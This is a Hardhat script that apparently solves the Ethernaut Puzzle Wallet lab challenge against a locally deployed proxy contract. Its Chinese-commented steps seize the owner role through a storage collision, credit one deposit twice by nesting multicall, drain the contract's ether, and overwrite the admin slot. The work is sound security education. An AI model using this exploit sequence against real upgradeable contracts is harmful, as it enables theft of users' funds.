const { ethers, network } = require("hardhat");
const PuzzleProxy = require(`../../deployments/${network.name}/PuzzleProxy.json`);
let chobyn = require(`../../deployments/${network.name}/Chobyn.json`);

async function main() {
    let [owner] = await ethers.getSigners();
    let provider = owner.provider
    const Abi = [
        "function owner() external view returns (address)",
        "function pendingAdmin() external view returns (address)",
        "function addToWhitelist(address) external",
        "function proposeNewAdmin(address) external",
        "function maxBalance() external view returns (uint)",
        "function balances(address) external view returns (uint)",
        "function multicall(bytes[]) payable external",
        "function execute(address to, uint256 value, bytes calldata data) payable external",
        "function setMaxBalance(uint) external",
      ];
    let proxyContract = await new ethers.Contract(PuzzleProxy.address, Abi, owner);

    // 1.先修改pendingAdmin，在PuzzleWallet相当于onwer
    // await proxyContract.proposeNewAdmin(owner.address)

    // 2.把自己添加进白名单
    // await proxyContract.addToWhitelist(owner.address)

    // 3.通过muticall编码，实现给一次存款但是存两次
    // let iface = new ethers.utils.Interface([
    //     "function multicall(bytes[] calldata data) payable",
    //     "function deposit() payable",
    // ])
    // console.log(iface.encodeFunctionData("deposit")) //0xd0e30db0
    // let depositSelector = iface.encodeFunctionData("deposit")
    // let multicallSelector = iface.encodeFunctionData("multicall", [[depositSelector]])
    // console.log(await proxyContract.multicall([depositSelector, multicallSelector], {value: 1000000000000000}))
    // console.log(await proxyContract.balances(owner.address))

    // 4.调用execute使得代理balance为0
    // await proxyContract.execute(owner.address, "2000000000000000", 0x0)
    // console.log(await provider.getBalance(PuzzleProxy.address))

    // 5.通过setMaxBalance去设置maxBalance从而改变admin
    // await proxyContract.setMaxBalance(chobyn.addressBytes)

    console.log(await provider.getStorageAt(proxyContract.address, 1))
}

main()
    .then(() =>process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
